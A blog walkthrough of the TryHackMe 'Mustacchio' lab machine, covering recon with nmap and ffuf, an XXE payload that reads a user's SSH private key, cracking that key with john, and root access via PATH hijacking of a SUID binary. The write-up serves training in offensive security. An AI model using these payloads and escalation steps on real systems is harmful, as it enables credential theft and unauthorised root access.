---
layout: single
title: TryHackMe - Mustacchio
description: A walkthrough of the TryHackMe "Mustacchio" machine.
date: 2021-06-11
classes: wide
header:
  teaser: /assets/images/THM-Mustacchio/teaser.PNG
tags:
  - XXE
  - XML External Entity
  - Nmap
  - Directory busting
  - Privilege Escalation
  - tail
  - strings
  - PATH
  - Mustacchio
  - TryHackMe 
--- 

# Introduction

In this blog, we'll be doing a walkthrough of [TryHackMe - Mustacchio](https://tryhackme.com/room/mustacchio). Many thanks to [zyeinn](https://tryhackme.com/p/zyeinn) for creating this awesome room! :) 

# Recon 

As usual, we'll run a Nmap port scan, just so we can see the potential attack vectors.

```
sudo nmap -p- 10.10.14.215 -A -oN nmap-all -v -T5 -Pn -n
```

Here is the output from the port scan:

```
# Nmap 7.91 scan initiated Fri Jun 11 15:16:22 2021 as: nmap -p- -A -oN nmap-all -v -T5 -sC -sV -Pn -n --min-rate 500 10.10.14.215
Nmap scan report for 10.10.14.215
Host is up (0.082s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d3:9e:50:66:5f:27:a0:60:a7:e8:8b:cb:a9:2a:f0:19 (RSA)
|   256 5f:98:f4:5d:dc:a1:ee:01:3e:91:65:0a:80:52:de:ef (ECDSA)
|_  256 5e:17:6e:cd:44:35:a8:0b:46:18:cb:00:8d:49:b3:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
```

# Path to user

I investigate the `nginx 1.10.3` server running on port 8765. Upon visiting the page, I am greeted by a login prompt.

![](/assets/images/THM-Mustacchio/login.PNG)

We will undertake directory busting in order to find any hidden files. I like to use either `gobuster` or `ffuf`. This time, I used [ffuf](https://github.com/ffuf/ffuf).

Here is the ffuf command: 

```
ffuf -u http://10.10.86.174:8765/FUZZ -w /opt/directory-list-2.3-medium.txt -c -ac -e .php, -ic -v | tee fuff-8765-2-3.txt
```

Breakdown:

```
-u   # The url to enumerate
-w   # the wordlist to use
-c   # Colorize output! :)
-ac  # Automatically calibrate filtering options
-e   # extensions to use (.php)
-ic  # Ignore wordlist comments
-v   # Verbose output, printing full URL and redirect location 
```

Anyway, ffuf finishes and reveals a file named  `home.php`. 

![](/assets/images/THM-Mustacchio/ffuf.PNG)

The output from ffuf shows that the home page redirects to `index.php`, let's take a closer look at this in [Burp](https://portswigger.net/burp).

It looks like although the page sends a `302 moved temporarily`, the page still can be seen in Burp before the redirect happens. This is probably due to the application checking user authentication near the end of the script rather than at the start. 

![](/assets/images/THM-Mustacchio/burp1.PNG)

I am able to see a comment, which allows me to enumerate a username called `Barry`

```html
<!-- Barry, you can now SSH in using your key!-->
```

![](/assets/images/THM-Mustacchio/burp-com.PNG)

I see another comment which directs me to a file called `/auth/dontforget.bak`. Looking at this file in Burp, it seems to show some XML. 

```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph ...<redacted>...</com>
</comment>
```

![](/assets/images/THM-Mustacchio/burp2.PNG)

I see a form, which looks like it's submitting some sort of user input to itself. This got me thinking about [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing).

> An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

```html
<form action="" method="post" class="container d-flex flex-column align-items-center justify-content-center">
	<textarea id="box" name="xml" rows="10" cols="50"></textarea><br/>
	<input type="submit" id="sub" onclick="checktarea()" value="Submit"/>
</form>
```

![](/assets/images/THM-Mustacchio/burp3.PNG)

Using the format shown in `/auth/dontforget.bak`, I craft the following `POST` data to `home.php`.

```
xml=
<!--?xml version="1.0" ?-->
	<comment>
	  <name>lol</name>
	  <author>lol</author>
	  <com>lol</com>
	</comment>
```

The full request: 

```
POST /home.php HTTP/1.1
Host: 10.10.86.174:8765
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=gjl6i83l0f2fjnf8o50d43nkt0;
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

xml=
<!--?xml version="1.0" ?-->
	<comment>
	  <name>lol</name>
	  <author>lol</author>
	  <com>lol</com>
	</comment>
```

Upon sending the request, I see that the name, author and comment of "lol" is reflected back into the page. 

![](/assets/images/THM-Mustacchio/burp4.PNG)

I now use a simple XXE payload from [here](https://github.com/payloadbox/xxe-injection-payload-list) to test for an injection.

```
xml=
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Random test"> ]>
	<comment>
	  <name>lol</name>
	  <author>lol</author>
	  <com>%26example%3b</com>
	</comment>
```

I am happy to see that "Random test" is reflected back into the page, so we have an XXE vulnerability.

![](/assets/images/THM-Mustacchio/burp5.PNG)

I use the XXE to read the `id_rsa` SSH key from `barry`. I knew to check here from the comment earlier which gave it away. Here is the payload to read the `id_rsa` file. 

```
xml=
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
	<comment>
	  <name>lol</name>
	  <author>lol</author>
	  <com>%26example%3b</com>
	</comment>
```

![](/assets/images/THM-Mustacchio/burp6.PNG)

Copy the id_rsa out of Burp and crack it on your local machine. 

```
/usr/share/john/ssh2john.py id_rsa >id.crack
john id.crack -w=/opt/rockyou.txt
```

![](/assets/images/THM-Mustacchio/cracked.PNG)

Now that you've cracked the SSH key, login to the box. 

```
chmod 600 id_rsa
ssh -i id_rsa barry@10.10.86.174
```

Gather your `user.txt` flag. :)

![](/assets/images/THM-Mustacchio/user.PNG)

# Path to root

Locate all SUID binaries on the box with `find`.

> The Unix access rights flags setuid and setgid (short for "set user ID" and "set group ID")[1] allow users to run an executable with the file system permissions of the executable's owner or group respectively.

```
find / -perm -4000 2>/dev/null
```

I see an interesting SUID binary in the `joe` home directory. 

```
20 -rwsr-xr-x 1 root root 16832 Apr 29 20:32 /home/joe/live_log
```

![](/assets/images/THM-Mustacchio/find.PNG)

I run `strings` against the binary, just to see if I can gather any useful information about how the binary works. 

```
strings /home/joe/live_log
```

Using `strings`, I see that the binary executes the `tail` binary, but does not use the absolute path of `/usr/bin/tail`. We should be able to exploit this to gain root as the OS will attempt to search for `tail` using our `PATH`, which we can control. Therefore, we can create a malicious `tail` and have it executed as root.  

![](/assets/images/THM-Mustacchio/strings.PNG)

Firstly, create a file called `/tmp/tail`.

```
nano /tmp/tail
```

Enter the following into the file and then save with CTRL+o then CTRL+x to quit.

```
#!/bin/bash

bash
```

Make the newly created file executable. 

```
chmod +x /tmp/tail
```

![](/assets/images/THM-Mustacchio/tails.PNG)

Set a new `PATH` variable for your user.

```
export PATH=/tmp:$PATH
```

![](/assets/images/THM-Mustacchio/newpath.PNG)

Execute the `live_log` binary for a root shell.

```
barry@mustacchio:~$ /home/joe/live_log
root@mustacchio:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1003(barry)
```

Gather your `root.txt` flag. :)

![](/assets/images/THM-Mustacchio/root.PNG)
